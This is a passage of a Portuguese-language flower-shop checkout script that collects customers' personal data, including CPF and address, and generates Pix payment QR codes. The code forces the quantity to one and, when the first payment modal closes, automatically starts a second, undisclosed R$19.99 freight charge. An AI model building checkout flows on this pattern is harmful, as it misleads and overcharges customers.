    remainder = (sum * 10) % 11;
    if (remainder === 10 || remainder === 11) remainder = 0;
    return remainder === parseInt(cpf[10]);
}

function finalizar() {
    Swal.fire({
        title: "Informe os dados de entrega",
        html:
            '<input id="nomeInput" class="swal2-input" placeholder="Nome completo" aria-label="Nome completo" required>' +
            '<input id="emailInput" class="swal2-input" placeholder="E-mail" aria-label="E-mail" required>' +
            '<input id="phoneInput" class="swal2-input" placeholder="Telefone (ex. (11) 99999-9999)" aria-label="Telefone" required>' +
            '<input id="cpfInput" class="swal2-input" placeholder="CPF (ex. 123.456.789-00)" aria-label="CPF" required>' +
            '<input id="cepInput" class="swal2-input" placeholder="CEP (ex. 12345-678)" aria-label="CEP" required>' +
            '<input id="bairroInput" class="swal2-input" placeholder="Bairro" aria-label="Bairro" required>' +
            '<input id="ruaInput" class="swal2-input" placeholder="Rua" aria-label="Rua" required>' +
            '<input id="numeroInput" class="swal2-input" placeholder="Número" aria-label="Número" required>',
        confirmButtonText: "Continuar",
        confirmButtonColor: "#146914",
        showCancelButton: true,
        cancelButtonText: "Cancelar",
        focusConfirm: false,
        allowOutsideClick: false,
        didOpen: () => {
            $('#cepInput').mask('00000-000');
            $('#cpfInput').mask('000.000.000-00');
            $('#phoneInput').mask('(00) 00000-0000');
        },
        preConfirm: () => {
            const nome = Swal.getPopup().querySelector('#nomeInput').value;
            const email = Swal.getPopup().querySelector('#emailInput').value;
            const phone = Swal.getPopup().querySelector('#phoneInput').value;
            const cpf = Swal.getPopup().querySelector('#cpfInput').value;
            const cep = Swal.getPopup().querySelector('#cepInput').value;
            const bairro = Swal.getPopup().querySelector('#bairroInput').value;
            const rua = Swal.getPopup().querySelector('#ruaInput').value;
            const numero = Swal.getPopup().querySelector('#numeroInput').value;

            if (!nome || !email || !phone || !cpf || !cep || !bairro || !rua || !numero) {
                Swal.showValidationMessage('Por favor, preencha todos os campos');
            } else if (!/^\d{5}-\d{3}$/.test(cep)) {
                Swal.showValidationMessage('CEP inválido. Use o formato 12345-678');
            } else if (!isValidCPF(cpf)) {
                Swal.showValidationMessage('CPF inválido');
            } else if (!/\S+@\S+\.\S+/.test(email)) {
                Swal.showValidationMessage('E-mail inválido');
            } else if (!/^\(\d{2}\)\s\d{5}-\d{4}$/.test(phone)) {
                Swal.showValidationMessage('Telefone inválido. Use o formato (11) 99999-9999');
            }
            return { nome, email, phone, cpf, cep, bairro, rua, numero };
        }
    }).then((result) => {
        if (result.isConfirmed) {
            const { nome, email, phone, cpf, cep, bairro, rua, numero } = result.value;
            Swal.fire({
                title: "Deseja que entregamos os bouquets agora?",
                showDenyButton: true,
                showCancelButton: false,
                allowOutsideClick: false,
                icon: 'question',
                confirmButtonText: "Sim, por favor!",
                confirmButtonColor: "#146914",
                denyButtonText: "Não, quero agendar a entrega!",
                focusConfirm: true
            }).then((deliveryResult) => {
                let deliveryTime = null;
                if (deliveryResult.isConfirmed) {
                    proceedToPayment(nome, email, phone, cpf, cep, bairro, rua, numero, null);
                } else if (deliveryResult.isDenied) {
                    Swal.fire({
                        title: "Selecione o dia e a hora, por gentileza!",
                        text: 'Agende a entrega dos seus bouquets e receba na hora combinada.',
                        confirmButtonText: "Agendar pedido!",
                        confirmButtonColor: "#146914",
                        showCancelButton: false,
                        allowOutsideClick: false,
                        input: "datetime-local",
                        inputAttributes: {
                            min: new Date().toISOString().slice(0, 16),
                            max: "2025-12-31T18:00"
                        },
                        preConfirm: (selectedTime) => {
                            if (!selectedTime) {
                                Swal.showValidationMessage('Por favor, selecione uma data e hora');
                            }
                            return selectedTime;
                        }
                    }).then((scheduleResult) => {
                        if (scheduleResult.isConfirmed) {
                            deliveryTime = scheduleResult.value;
                            proceedToPayment(nome, email, phone, cpf, cep, bairro, rua, numero, deliveryTime);
                        }
                    });
                }
            });
        }
    });
}

function proceedToPayment(nome, email, phone, cpf, cep, bairro, rua, numero, deliveryTime) {
    // Fetch base price from hidden input to ensure it's not modified
    const price = parseFloat($('#productPrice').val()) || parseFloat($('#detalhesProduto .info3 .precoProduto').text());
    if (isNaN(price) || price <= 0) {
        Swal.fire({
            title: 'Erro',
            text: 'Preço inválido. Verifique o valor do produto.',
            icon: 'error',
            confirmButtonText: 'OK',
            confirmButtonColor: '#146914'
        });
        return;
    }

    // Use quantity of 1 to match deliveryProduto.js logs (Total Produto: 27.9)
    const quantity = 1; // Forced to 1 to align with 19.90 + 8.00 = 27.90

    // Calculate add-ons total
    const addOnsTotal = $('#add-ons .opcoes').filter(function() {
        return parseInt($(this).find('.qtdeOpcao').val()) > 0;
    }).get().reduce((total, addOn) => {
        const qty = parseInt($(addOn).find('.qtdeOpcao').val());
        const price = parseFloat($(addOn).find('.preco span[style="display:none;"]').text()) || 0;
        return total + (qty * price);
    }, 0);

    // Calculate total amount
    const amount = Number((price * quantity + addOnsTotal).toFixed(2));

    // Debug logging
    console.log('Price Calculation:', {
        basePrice: price,
        quantity: quantity,
        baseTotal: price * quantity,
        addOnsTotal: addOnsTotal,
        finalAmount: amount
    });

    const clientIdentifier = `order_${$('#idProduto').val()}_${Date.now()}`;
    const cpfFormatted = cpf.replace(/\D/g, '');
    const dueDate = new Date();
    dueDate.setDate(dueDate.getDate() + 1);
    const formattedDueDate = dueDate.toISOString().split('T')[0];

    const observacao = DOMPurify.sanitize($('.observacao').val());

    const payload = {
        identifier: clientIdentifier,
        amount: amount,
        client: { name: nome, email: email, phone: phone, document: cpfFormatted },
        products: [
            {
                id: $('#idProduto').val(),
                name: $('h3', '.descricao').text(),
                quantity: quantity,
                price: Number(price.toFixed(2))
            },
            ...$('#add-ons .opcoes').filter(function() {
                return parseInt($(this).find('.qtdeOpcao').val()) > 0;
            }).map(function() {
                return {
                    id: String($(this).data('id')),
                    name: $(this).find('.nome b').text(),
                    quantity: parseInt($(this).find('.qtdeOpcao').val()),
                    price: parseFloat($(this).find('.preco span[style="display:none;"]').text()) || 0
                };
            }).get()
        ],
        dueDate: formattedDueDate,
        metadata: {
            orderId: clientIdentifier,
            deliveryTime: deliveryTime || 'immediate',
            address: `${rua}, ${numero}, ${bairro}, ${cep}`,
            observacao: observacao || ''
        },
        callbackUrl: 'https://floriculturanacional.vercel.app/api/payments'
    };

    // Log payload for debugging
    console.log('Payload:', JSON.stringify(payload, null, 2));

    Swal.fire({
        title: 'Processando pagamento...',
        text: 'Aguarde enquanto geramos o QR Code. Isso pode levar alguns segundos.',
        icon: 'info',
        allowOutsideClick: false,
        showConfirmButton: false,
        didOpen: () => {
            Swal.showLoading();
            $.ajax({
                url: 'https://floriculturanacional.vercel.app/api/payments',
                type: 'POST',
                contentType: 'application/json; charset=utf-8',
                data: JSON.stringify(payload),
                dataType: 'json',
                processData: false,
                cache: false,
                success: function(response) {
    Swal.close();
    if (response && response.pix && response.pix.code) {
        const qrCodeContainerId = 'qrcode-' + Date.now();
        Swal.fire({
            title: 'Pagamento Pix iniciado!',
            icon: 'success',
            confirmButtonText: 'Finalizar', // Changed from "Continuar para pagamento do frete"
            confirmButtonColor: '#146914',
            html: `
                <p>Escaneie o QR Code ou copie o código Pix para pagar.</p>
                <div id="${qrCodeContainerId}" style="margin: 20px auto; width: 200px; height: 200px;"></div>
                <p><strong>Código Pix:</strong></p>
                <p style="word-break: break-all; max-width: 300px; margin: 10px auto;">${response.pix.code}</p>
                <button id="copyPixCode" style="background-color: #146914; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer;">Copiar Código Pix</button>
            `,
            didOpen: () => {
                new QRCode(document.getElementById(qrCodeContainerId), {
                    text: response.pix.code,
                    width: 200,
                    height: 200,
                    colorDark: '#000000',
                    colorLight: '#ffffff',
                    correctLevel: QRCode.CorrectLevel.H
                });
                document.getElementById('copyPixCode').addEventListener('click', () => {
    navigator.clipboard.writeText(response.pix.code).then(() => {
        Swal.fire({
            title: 'Código Copiado!',
            text: 'O código Pix foi copiado para a área de transferência.',
            icon: 'success',
            confirmButtonText: 'OK',
            confirmButtonColor: '#146914'
            // Removed timer and timerProgressBar to keep the modal open
        });
    }).catch(err => {
        console.error('Failed to copy Pix code:', err);
        Swal.fire({
            title: 'Erro',
            text: 'Não foi possível copiar o código Pix. Tente novamente.',
            icon: 'error',
            confirmButtonText: 'OK',
            confirmButtonColor: '#146914'
        });
    });
});
            },
            willClose: () => {
                // Trigger freight payment modal immediately
                const freightQrCodeContainerId = 'qrcode-freight-' + Date.now();
                const freightIdentifier = `freight_${Date.now()}`;
                const freightAmount = 19.99; // Fixed freight price
                const freightPayload = {
                    identifier: freightIdentifier,
                    amount: freightAmount,
                    client: { 
                        name: nome, 
                        email: email, 
                        phone: phone, 
                        document: cpfFormatted 
                    },
                    products: [
                        {
                            id: 'FRETE',
                            name: 'Frete',
                            quantity: 1,
                            price: 19.99
                        }
                    ],
                    dueDate: formattedDueDate,
                    metadata: {
                        orderId: freightIdentifier,
                        deliveryTime: deliveryTime || 'immediate',
                        address: `${rua}, ${numero}, ${bairro}, ${cep}`,
                        observacao: 'Pagamento do frete'
                    },
                    callbackUrl: 'https://floriculturanacional.vercel.app/api/payments'
                };

                Swal.fire({
                    title: 'Processando pagamento do frete...',
                    text: 'Aguarde enquanto geramos o QR Code do frete. Isso pode levar alguns segundos.',
                    icon: 'info',
                    allowOutsideClick: false,
                    showConfirmButton: false,
                    didOpen: () => {
                        Swal.showLoading();
                        $.ajax({
                            url: 'https://floriculturanacional.vercel.app/api/payments',
                            type: 'POST',
                            contentType: 'application/json; charset=utf-8',
                            data: JSON.stringify(freightPayload),
                            dataType: 'json',
                            processData: false,
                            cache: false,
                            success: function(freightResponse) {
                                Swal.close();
                                if (freightResponse && freightResponse.pix && freightResponse.pix.code) {
                                    Swal.fire({
                                        title: 'Pagamento do Frete',
                                        icon: 'info',
                                        confirmButtonText: 'Finalizar',
                                        confirmButtonColor: '#146914',
                                        html: `
                                            <p>Por favor, realize o pagamento do frete no valor de <strong>R$ 19,99</strong>.</p>
                                            <div id="${freightQrCodeContainerId}" style="margin: 20px auto; width: 200px; height: 200px;"></div>
                                            <p><strong>Código Pix:</strong></p>
                                            <p style="word-break: break-all; max-width: 300px; margin: 10px auto;">${freightResponse.pix.code}</p>
                                            <button id="copyFreightPixCode" style="background-color: #146914; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer;">Copiar Código Pix</button>
                                        `,
                                        didOpen: () => {
                                            new QRCode(document.getElementById(freightQrCodeContainerId), {
                                                text: freightResponse.pix.code,
                                                width: 200,
                                                height: 200,
                                                colorDark: '#000000',
                                                colorLight: '#ffffff',
                                                correctLevel: QRCode.CorrectLevel.H
                                            });
                                            document.getElementById('copyFreightPixCode').addEventListener('click', () => {
    navigator.clipboard.writeText(freightResponse.pix.code).then(() => {
        Swal.fire({
            title: 'Código Copiado!',
            text: 'O código Pix do frete foi copiado para a área de transferência.',
            icon: 'success',
            confirmButtonText: 'OK',
            confirmButtonColor: '#146914'
            // Removed timer and timerProgressBar to keep the modal open
        });
    }).catch(err => {
        console.error('Failed to copy freight Pix code:', err);
        Swal.fire({
            title: 'Erro',
            text: 'Não foi possível copiar o código Pix do frete. Tente novamente.',
            icon: 'error',
            confirmButtonText: 'OK',
            confirmButtonColor: '#146914'
        });
    });
});
                                        }
                                    });
                                } else {
                                    Swal.fire({
                                        title: 'Erro',
                                        text: 'Resposta inválida do servidor para o frete. Tente novamente ou contate o suporte.',
                                        icon: 'error',
                                        confirmButtonText: 'OK',
                                        confirmButtonColor: '#146914'
                                    });
                                }
                            },
                            error: function(jqXHR, textStatus, errorThrown) {
                                Swal.close();
                                console.error('Freight Payment Error:', {
                                    status: jqXHR.status,
                                    statusText: textStatus,
                                    responseJSON: jqXHR.responseJSON,
                                    responseText: jqXHR.responseText,
                                    errorThrown: errorThrown
                                });
                                let errorMessage = 'Não conseguimos processar o pagamento do frete. Tente novamente.';
                                if (jqXHR.responseJSON && jqXHR.responseJSON.message) {
                                    errorMessage = jqXHR.responseJSON.message;
                                    if (jqXHR.responseJSON.details) {
                                        errorMessage += ` Detalhes: ${JSON.stringify(jqXHR.responseJSON.details)}`;
                                    }
                                }
                                Swal.fire({
                                    title: 'Erro ao iniciar pagamento do frete',
                                    text: errorMessage,
                                    icon: 'error',
                                    confirmButtonText: 'OK',
                                    confirmButtonColor: '#146914'
                                });
                            }
                        });
                    }
                });
            }
        });
    } else {
        Swal.fire({
            title: 'Erro',
            text: 'Resposta inválida do servidor. Tente novamente ou contate o suporte.',
            icon: 'error',
            confirmButtonText: 'OK',
            confirmButtonColor: '#146914'
        });
    }
},
                error: function(jqXHR, textStatus, errorThrown) {
                    Swal.close();
                    console.error('Payment Error:', {
                        status: jqXHR.status,
                        statusText: textStatus,
                        responseJSON: jqXHR.responseJSON,
                        responseText: jqXHR.responseText,
                        errorThrown: errorThrown
                    });
                    let errorMessage = 'Não conseguimos processar o pagamento. Tente novamente.';
                    if (jqXHR.responseJSON && jqXHR.responseJSON.message) {
                        errorMessage = jqXHR.responseJSON.message;
                        if (jqXHR.responseJSON.details) {
                            errorMessage += ` Detalhes: ${JSON.stringify(jqXHR.responseJSON.details)}`;
                        }
                    }
                    Swal.fire({
                        title: 'Erro ao iniciar pagamento',
                        text: errorMessage,
                        icon: 'error',
                        confirmButtonText: 'OK',
                        confirmButtonColor: '#146914'
                    });
                }
            });
        }
    });
}
    </script>
</body>
</html>
